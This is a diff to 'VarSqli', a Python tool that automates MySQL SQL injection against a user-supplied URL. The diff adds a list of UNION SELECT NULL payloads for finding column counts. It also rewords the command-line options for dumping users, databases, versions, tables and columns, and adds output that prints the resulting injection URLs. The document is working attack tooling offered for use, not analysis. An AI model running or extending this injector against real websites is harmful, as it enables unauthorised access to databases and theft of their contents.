@@ -6,6 +6,8 @@ import argparse
 import os
 from colorama import Fore
 from colorama import Style
+from bs4 import BeautifulSoup
+from lxml import etree
 
 colorama.init()
 
@@ -14,10 +16,10 @@ def banner():
     print(Fore.YELLOW + Style.BRIGHT + '''
               ___
  _____         H  _____     _ _  {1.1.5}
-|  |  |___ ___[,]|   __|___| |_|
-|  |  | .'|  _[(]|__   | . | | | {Phamchien}
+|  |  |___ ___[,]|   __|___| |_| 
+|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
  \___/|__,|_| [)]|_____|_  |_|_|
-               V         |_|   ghostmanews.blogspot.com
+               V         |_|  ghostmanews.blogspot.com
 ''' + Style.RESET_ALL)
     print('''
         VarSqli , Auto Injected MySQL
@@ -53,19 +55,38 @@ payloads = [
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18',
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19',
     '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
+    '/**8**/UNION SELECT ALL NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
+    '/**8**/UNION SELECT ALL NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL',
 ]
 
 parser = argparse.ArgumentParser(description="VarSqli - (Variable Sql Injection) Tools V1.1.5")
 parser.add_argument('-u', '--url', dest='url', type=str, help='URL Target (ex : https://testphp.vulnweb.com/listproduct?cat=1)')
-parser.add_argument('--check-vuln', dest='check', action='store_true', help='Checking Vulnerablity SQL Injection')
-parser.add_argument('--check-columns', dest='columns', action='store_true', help='Checking Get Number Columns')
-parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='Checking Get Dbs')
+parser.add_argument('--check-vuln', dest='check', action='store_true', help='Check to see if the site is vulnerable')
+parser.add_argument('--check-columns', dest='columns', action='store_true', help='check MYSQL numeric columns')
+parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='check the user, dbs, version . entries')
 
-parser.add_argument('--dump-tables', dest='tables', action='store_true', help='Dump DBMS Tables')
-parser.add_argument('-T', '--tables-name', dest='name_db', help='Name Database to Testing GET Columns Tables')
+parser.add_argument('--dump-tables', dest='tables', action='store_true', help='dump all tables of SQL Injection target')
+parser.add_argument('-T', '--tables-name', dest='name_db', help='DBMS name (Database) to dump tables')
 
-parser.add_argument('--dump-columns', dest='column', action='store_true', help='Dump DBMS Columns ')
-parser.add_argument('-C', '--columns-name', dest='name_column', help='Name columns DBMS to Testing GET Columns from Tables')
+parser.add_argument('--dump-columns', dest='column', action='store_true', help='dump all columns tables of SQL Injection target')
+parser.add_argument('-C', '--columns-name', dest='name_column', help='DBMS name (Database) to dump columns tables')
 args = parser.parse_args()
 
 URL_TARGET = args.url
@@ -99,15 +120,27 @@ if URL_TARGET:
                 num_columns += 1
                 result_2 = requests.get(URL_TARGET + payload_2)
                 if str(num_columns) in result_2.text:
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "numeric columns detected...")
+                    time.sleep(0.20)
+                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "TESTING UNION SELECT ALL (MYSQL COMMAND)...")
+                    time.sleep(0.30)
                     if "The used SELECT" in result_2.text:
                         print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
+                        time.sleep(0.30)
+                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Next Payloading...")
                     else:
-                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Completed")
+                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find Testing , Find ALL columns : {}".format(num_columns))
+                        time.sleep(0.20)
                         print("Parameter : 1")
                         print("     Type : UNION SELECT ALL (Number Columns MySQL)")
                         print("     Title : GETING columns number MySQL")
+                        print("")
                         print("     Payload : {}".format(payload_2))
+                        print("")
                         print("     URL : {}".format(URL_TARGET))
+                        print("")
+                        print("     LINK : {}{}".format(URL_TARGET, payload_2))
+                        print("")
                         print("     Columns : : {}".format(num_columns))
                         print("")
                         if args.dbs:
@@ -123,6 +156,7 @@ if URL_TARGET:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
                                 print("Username MySQL : ")
                                 print("      Payload : {}".format(payload_3))
+                                print("")
                                 print("      URL : {}".format(URL_TARGET))
                                 print("")
                                 print("      LINK : {}{}".format(URL_TARGET, payload_3))
@@ -137,8 +171,9 @@ if URL_TARGET:
                                 exit()
                             else:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
-                                print("Username MySQL : ")
+                                print("Database MySQL : ")
                                 print("      Payload : {}".format(payload_4))
+                                print("")
                                 print("      URL : {}".format(URL_TARGET))
                                 print("")
                                 print("      LINK : {}{}".format(URL_TARGET, payload_4))
@@ -155,8 +190,9 @@ if URL_TARGET:
                                 exit()
                             else:
                                 print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
-                                print("Username MySQL : ")
+                                print("version MySQL : ")
                                 print("      Payload : {}".format(payload_5))
+                                print("")
                                 print("      URL : {}".format(URL_TARGET))
                                 print("")
                                 print("      LINK : {}{}".format(URL_TARGET, payload_5))
@@ -176,8 +212,10 @@ if URL_TARGET:
                                     exit()
                                 else:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
-                                    print("Username MySQL : ")
+                                    print("")
+                                    print("Database Tables Names MySQL : ")
                                     print("      Payload : {}".format(payload_6))
+                                    print("")
                                     print("      URL : {}".format(URL_TARGET))
                                     print("")
                                     print("      LINK : {}{}".format(URL_TARGET, payload_6))
@@ -197,16 +235,16 @@ if URL_TARGET:
                                     exit()
                                 else:
                                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
-                                    print("Username MySQL : ")
+                                    print("Database Name Columns DBMS Tables MySQL : ")
                                     print("      Payload : {}".format(payload_7))
+                                    print("")
                                     print("      URL : {}".format(URL_TARGET))
                                     print("")
                                     print("      LINK : {}{}".format(URL_TARGET, payload_7))
                                     print("")
                                     exit()
                             else:
-                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-columns -C < Name DB >")
-                                
+                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-columns -C < Name DB >")            
                 else:
                     print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Failed Get Columns")
                     exit()
